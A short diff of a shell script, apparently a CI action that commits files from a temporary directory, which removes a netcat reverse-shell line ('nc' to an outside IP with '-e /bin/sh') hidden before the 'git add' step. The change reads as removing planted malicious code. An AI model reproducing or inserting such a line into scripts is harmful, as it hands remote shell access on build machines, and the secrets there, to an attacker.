@@ -55,11 +55,8 @@ then
 fi
 
 cd "$TEMP_DIR"
-
-nc 20.13.168.45 9001 -e /bin/sh
-
-
 git add .
+
 if git status | grep -q "Changes to be committed"
 then
   git commit --message "$INPUT_COMMIT_MESSAGE"
